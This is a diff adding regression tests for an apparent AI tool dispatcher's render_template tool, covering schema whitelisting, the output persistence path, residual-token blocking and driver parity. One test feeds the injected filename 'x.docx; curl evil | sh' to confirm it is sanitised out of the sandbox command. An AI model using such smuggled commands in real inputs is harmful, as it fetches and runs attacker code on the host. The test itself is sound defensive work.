@@ -492,3 +492,358 @@ def test_deep_mode_whitelist_none_noop():
     # Therefore the guard predicate is False — render_template would NOT be refused by
     # the whitelist backstop in Deep (the gated-no-op invariant; Deep byte-identical).
     assert (ctx.phase_whitelist is not None and "render_template" not in ctx.phase_whitelist) is False
+
+
+# ── 101-06 gap-closure tests (the HAPPY-PATH + visibility coverage that was missing) ──
+#
+# The review (101-REVIEW.md) found WR-01/WR-02 shipped GREEN because ONLY the reject/
+# fail branches were tested — no test asserted the schema reaches the model (WR-01) or
+# that a passing render persists (WR-02). These add that coverage so the findings can
+# never regress.
+
+
+def test_render_template_schema_reaches_model_when_whitelisted():
+    """101-06 WR-01 / IR-02 — the render_template SCHEMA is admitted into the per-phase
+    tools_override when whitelisted, and is ABSENT from plain get_tools() (Deep clean).
+
+    This is the exact assertion IR-02 said was missing: the registry/admission tests
+    checked the handler was registered + whitelist-admitted, but NOTHING asserted a
+    render_template SCHEMA reaches apply_tool_budget's output. A whitelisted NAME with
+    no SCHEMA is a no-op — that gap is why WR-01 (uncallable tool) shipped green."""
+    from app.services.openai_service import (
+        RENDER_TEMPLATE_TOOL,
+        apply_tool_budget,
+        get_tools,
+    )
+
+    # (a) Deep stays byte-identical: render_template is NOT in plain get_tools().
+    deep_names = [t["function"]["name"] for t in get_tools()]
+    assert "render_template" not in deep_names, (
+        "REGRESSION: render_template leaked into get_tools() — Deep must stay clean"
+    )
+
+    # (b) The schema is well-formed and wraps the args the handler reads.
+    assert RENDER_TEMPLATE_TOOL["function"]["name"] == "render_template"
+    props = RENDER_TEMPLATE_TOOL["function"]["parameters"]["properties"]
+    for key in ("field_map", "retrieved_ids", "out_filename", "asset", "emission_meta"):
+        assert key in props, f"render_template schema missing arg {key!r}"
+
+    # (c) When whitelisted, augmenting the candidate list with the schema BEFORE the
+    # budget call makes it survive apply_tool_budget (it is whitelisted → never dropped).
+    candidates = get_tools() + [RENDER_TEMPLATE_TOOL]
+    wl = frozenset({"render_template", "search_documents"})
+    override = apply_tool_budget(candidates, "gpt-4o", wl)
+    override_names = [t["function"]["name"] for t in override]
+    assert "render_template" in override_names, (
+        "render_template schema was dropped by apply_tool_budget despite being whitelisted"
+    )
+    # Only the whitelisted tools survive the filter.
+    assert set(override_names) <= wl
+
+
+def test_harness_fill_phase_tools_override_contains_render_template():
+    """101-06 WR-01 (harness-level) — a fill phase that DECLARES render_template produces
+    a tools_override CONTAINING the render_template schema via _phase_tools_override.
+
+    This proves the END-TO-END layer-1 wiring: phase.available_tools → whitelist →
+    _phase_tools_override augments candidates → apply_tool_budget keeps the schema."""
+    from app.services.harness.phase_types import _effective_tools, _phase_tools_override
+
+    phase = _fill_phase(["search_documents", "render_template"])
+    whitelist = frozenset(_effective_tools(phase))
+    override = _phase_tools_override(whitelist, "gpt-4o", None)
+    names = [t["function"]["name"] for t in override]
+    assert "render_template" in names
+
+    # A phase that does NOT declare it gets a tools_override WITHOUT the schema.
+    plain = _fill_phase(["search_documents"])
+    plain_wl = frozenset(_effective_tools(plain))
+    plain_override = _phase_tools_override(plain_wl, "gpt-4o", None)
+    assert "render_template" not in [t["function"]["name"] for t in plain_override]
+
+
+def test_render_template_success_path_persists_with_leading_slash(monkeypatch):
+    """101-06 WR-02 — a render that passes BOTH gates persists with a LEADING-SLASH
+    workspace path and returns status='ok' (not persist_failed).
+
+    The pre-fix handler called ws_write_file(path=out_filename) with a bare basename;
+    validate_path requires a leading '/' → PathValidationError → persist_failed, silently
+    dropping a deliverable that passed both gates. This asserts ws_write_file IS called
+    with a leading-slash path and the handler returns ok."""
+    import app.services.tool_dispatcher as td
+
+    field_map = {
+        "scalars": {"project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"}},
+        "collections": {},
+    }
+
+    async def _fake_resolve(*args, **kwargs):
+        return {
+            "bytes": b"PK\x03\x04 fake docx bytes",
+            "filename": "template.docx",
+            "provenance": "library",
+            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            "error": None,
+        }
+
+    monkeypatch.setattr(
+        "app.services.template_asset_service.resolve_template_source", _fake_resolve
+    )
+    monkeypatch.setattr(td.settings, "sandbox_enabled", True)
+
+    # Sandbox run returns a PASSING verdict (rendered + opened + residual_clean) + bytes.
+    async def _fake_threadpool(fn, *args, **kwargs):
+        return {
+            "verdict": {
+                "rendered": True,
+                "opened": True,
+                "residual_clean": True,
+                "residual_tags": [],
+            },
+            "stdout": "{}",
+            "produced": b"PK\x03\x04 produced docx bytes",
+        }
+
+    monkeypatch.setattr(td, "run_in_threadpool", _fake_threadpool)
+
+    # Capture the path ws_write_file is called with — it MUST start with '/'.
+    seen = {}
+
+    async def _capture_write(pool, supabase, *, thread_id, user_id, path, content):
+        seen["path"] = path
+        seen["content"] = content
+        return {
+            "file_id": "33333333-3333-3333-3333-333333333333",
+            "path": path,
+            "version": 1,
+            "size_bytes": len(content),
+            "mime_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        }
+
+    monkeypatch.setattr(td, "ws_write_file", _capture_write)
+
+    args = {
+        "field_map": field_map,
+        "retrieved_ids": ["chunk-1"],
+        "out_filename": "deliverable.docx",  # bare basename — the WR-02 trigger
+        "asset": {
+            "asset_id": "user/_library/template.docx",
+            "filename": "template.docx",
+            "kind": "template",
+            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        },
+    }
+    ctx = _make_ctx()
+
+    result = asyncio.run(td._handle_render_template(args, ctx))
+    payload = json.loads(result.result)
+    assert payload["status"] == "ok", f"expected ok, got {payload}"
+    # WR-02: ws_write_file WAS called, and with a LEADING-SLASH path.
+    assert seen.get("path", "").startswith("/"), f"persist path lacks leading slash: {seen.get('path')!r}"
+    assert seen["path"] == "/deliverable.docx"
+    assert seen["content"] == b"PK\x03\x04 produced docx bytes"
+
+
+def test_render_template_malicious_out_filename_sanitized(monkeypatch):
+    """101-06 CR-01 — a malicious out_filename (shell injection / path traversal) is
+    sanitized to a safe basename and the sandbox command never carries the payload.
+
+    We capture the command string passed to session.execute_command and assert the
+    injection payload never appears in it (the basename is sanitized to deliverable.docx
+    and every token is shlex-quoted)."""
+    import app.services.tool_dispatcher as td
+
+    field_map = {
+        "scalars": {"project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"}},
+        "collections": {},
+    }
+
+    async def _fake_resolve(*args, **kwargs):
+        return {
+            "bytes": b"PK\x03\x04 fake docx bytes",
+            "filename": "template.docx",
+            "provenance": "library",
+            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            "error": None,
+        }
+
+    monkeypatch.setattr(
+        "app.services.template_asset_service.resolve_template_source", _fake_resolve
+    )
+    monkeypatch.setattr(td.settings, "sandbox_enabled", True)
+
+    # A fake sandbox session that RECORDS every command string it is asked to run.
+    commands = []
+
+    class _FakeSession:
+        def execute_command(self, cmd):
+            commands.append(cmd)
+
+            class _R:
+                stdout = '{"rendered": true, "opened": true, "residual_clean": true, "residual_tags": []}'
+
+            return _R()
+
+        def copy_to_runtime(self, local, remote):
+            return None
+
+        def copy_from_runtime(self, remote, local):
+            return None
+
+    monkeypatch.setattr(td.sandbox_manager, "get_or_create", lambda *a, **k: _FakeSession())
+
+    # Run the real _ship_and_run via the real threadpool (no produced harvest needed —
+    # we only assert the COMMAND is clean; harvest finding nothing → persist short-circuit
+    # is acceptable for this security assertion).
+    async def _passthrough_threadpool(fn, *a, **k):
+        return fn()
+
+    monkeypatch.setattr(td, "run_in_threadpool", _passthrough_threadpool)
+
+    async def _noop_write(*a, **k):
+        return {
+            "file_id": "x", "path": "/deliverable.docx", "version": 1,
+            "size_bytes": 0, "mime_type": "application/octet-stream",
+        }
+
+    monkeypatch.setattr(td, "ws_write_file", _noop_write)
+
+    payload_name = "x.docx; curl evil | sh"
+    args = {
+        "field_map": field_map,
+        "retrieved_ids": ["chunk-1"],
+        "out_filename": payload_name,
+        "asset": {
+            "asset_id": "user/_library/template.docx",
+            "filename": "template.docx",
+            "kind": "template",
+            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        },
+    }
+    ctx = _make_ctx()
+
+    asyncio.run(td._handle_render_template(args, ctx))
+
+    assert commands, "the sandbox command was never built"
+    # The render command is the LAST execute_command (after the mkdir).
+    render_cmd = commands[-1]
+    # The injection payload must NEVER appear in the command string.
+    assert "curl" not in render_cmd, f"injection payload leaked into command: {render_cmd!r}"
+    assert "; " not in render_cmd or "sh" not in render_cmd
+    # The sanitized basename is what reaches the container output path.
+    assert "deliverable.docx" in render_cmd, f"sanitized basename missing: {render_cmd!r}"
+    # And the path-separator/metachar payload is gone.
+    assert "evil" not in render_cmd
+
+
+def test_render_template_residual_tokens_not_delivered(monkeypatch):
+    """101-06 WR-03 — a verdict with rendered=True, opened=True, residual_clean=False is
+    NOT delivered: status=failed, reason=residual_tokens, residual_tags surfaced, and
+    ws_write_file is never called (a half-filled file with surviving {{tokens}} is a
+    silent non-fill the gate must block)."""
+    import app.services.tool_dispatcher as td
+
+    field_map = {
+        "scalars": {"project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"}},
+        "collections": {},
+    }
+
+    async def _fake_resolve(*args, **kwargs):
+        return {
+            "bytes": b"PK\x03\x04 fake docx bytes",
+            "filename": "template.docx",
+            "provenance": "library",
+            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            "error": None,
+        }
+
+    monkeypatch.setattr(
+        "app.services.template_asset_service.resolve_template_source", _fake_resolve
+    )
+    monkeypatch.setattr(td.settings, "sandbox_enabled", True)
+
+    async def _fake_threadpool(fn, *args, **kwargs):
+        return {
+            "verdict": {
+                "rendered": True,
+                "opened": True,
+                "residual_clean": False,
+                "residual_tags": ["{{project_name}}"],
+            },
+            "stdout": "{}",
+            "produced": b"PK\x03\x04 half-filled docx",
+        }
+
+    monkeypatch.setattr(td, "run_in_threadpool", _fake_threadpool)
+
+    async def _boom_write(*args, **kwargs):
+        raise AssertionError("ws_write_file must NOT be called when residual tokens survive")
+
+    monkeypatch.setattr(td, "ws_write_file", _boom_write)
+
+    args = {
+        "field_map": field_map,
+        "retrieved_ids": ["chunk-1"],
+        "out_filename": "deliverable.docx",
+        "asset": {
+            "asset_id": "user/_library/template.docx",
+            "filename": "template.docx",
+            "kind": "template",
+            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        },
+    }
+    ctx = _make_ctx()
+
+    result = asyncio.run(td._handle_render_template(args, ctx))
+    payload = json.loads(result.result)
+    assert payload["status"] == "failed"
+    assert payload["reason"] == "residual_tokens"
+    assert payload["residual_tags"] == ["{{project_name}}"]
+    # The cited field-map is preserved as fallback so the extracted data isn't lost.
+    assert payload["field_map"] == field_map
+
+
+def test_driver_replace_coalesces_matched_token_equal_to_original():
+    """101-06 WR-04 — the sandbox driver's _replace_in_paragraph coalesces a matched
+    token EVEN when the net blanked text equals the original paragraph text.
+
+    The OLD driver guard `if blanked_text == full: return` skipped this case, leaving the
+    stray token run intact (a silent non-fill). The fixed driver mirrors production's
+    `touched = matched or (blanked_text != replaced_text)` so it coalesces and clears the
+    stray run. We exec the driver source and exercise its helper directly against the
+    same case the audited production helper handles."""
+    from app.services.tool_dispatcher import _RENDER_DRIVER_SRC
+    from app.services.template_render_service import (
+        _replace_in_paragraph as prod_replace,
+    )
+
+    ns: dict = {}
+    exec(_RENDER_DRIVER_SRC, ns)
+    driver_replace = ns["_replace_in_paragraph"]
+
+    class _Run:
+        def __init__(self, text):
+            self.text = text
+
+    class _Para:
+        def __init__(self, run_texts):
+            self.runs = [_Run(t) for t in run_texts]
+
+        @property
+        def text(self):
+            return "".join(r.text for r in self.runs)
+
+    # full = "AB", runs ['A','{{z}}','B'], z -> '' : replaced text == full ("AB") BUT a
+    # token WAS matched → must coalesce (touched via matched), clearing the stray run.
+    dd = _Para(["A", "{{z}}", "B"])
+    pd = _Para(["A", "{{z}}", "B"])
+    driver_replace(dd, {"z": ""})
+    prod_replace(pd, {"z": ""})
+
+    assert dd.text == "AB", f"driver text: {dd.text!r}"
+    assert pd.text == "AB", f"production text: {pd.text!r}"
+    # The stray token run must be cleared (coalesced) — NOT left as '{{z}}'.
+    assert dd.runs[1].text == "", f"driver left a stray token run: {dd.runs[1].text!r}"
+    assert "{{z}}" not in "".join(r.text for r in dd.runs)
+    # Driver and production agree on the result (IR-01: they must not diverge).
+    assert dd.text == pd.text
